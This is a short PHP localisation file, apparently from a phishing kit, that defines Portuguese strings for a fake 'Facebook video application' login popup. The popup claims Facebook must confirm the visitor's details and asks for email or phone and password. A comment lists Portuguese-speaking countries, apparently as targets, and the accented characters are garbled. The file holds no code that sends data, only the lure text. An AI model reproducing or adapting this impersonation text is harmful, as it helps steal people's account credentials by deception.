<?php
/*
-----------------
Idioma: Espanol
-----------------
*/
 
$lang = array();
 
// General

$lang['LANG'] = 'pt';
 
// Fondo

$lang['TITULO_PAGINA'] = 'Aplica��o Facebook';
 
// Pop-UP
 
$lang['POPUP_TITULO'] = 'Facebook aplica��o de v�deo (Free)';
$lang['POPUP_DESCRIPCION'] = 'Facebook tem de confirmar a seguinte informa��o para permitir o acesso a esta aplica��o v�deos, fa�a o login!';
$lang['POPUP_CORREO'] = 'E-mail ou telefone';
$lang['POPUP_CONTRASENA'] = 'Senha';
$lang['POPUP_SUBMIT'] = 'Entrar';
$lang['POPUP_CANDADO'] = 'Esta aplica��o n�o est� autorizado a publicar no Facebook.';

/*
array("Brazil", "Mozambique", "Angola", "Portugal", "Guinea-Bissau", "Timor-leste", "Macau", "Cape Verde", "Sao Tome and Principe")
*/